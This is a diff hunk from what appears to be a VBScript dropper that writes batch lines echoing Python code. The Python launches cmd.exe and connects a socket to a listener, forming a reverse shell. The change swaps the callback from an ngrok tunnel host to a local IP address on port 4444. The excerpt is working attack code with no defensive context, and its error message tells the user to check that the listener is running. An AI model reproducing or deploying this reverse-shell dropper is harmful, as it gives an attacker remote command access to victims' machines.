@@ -22,7 +22,7 @@ objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, std
 objFile.WriteLine "        echo    s = socket.socket^(^)"
 objFile.WriteLine "        echo."
 objFile.WriteLine "        echo    try:"
-objFile.WriteLine "        echo        s.connect^(^('2.tcp.eu.ngrok.io', 10739^)^)"
+objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
 objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
 objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
 objFile.WriteLine "        echo        return"
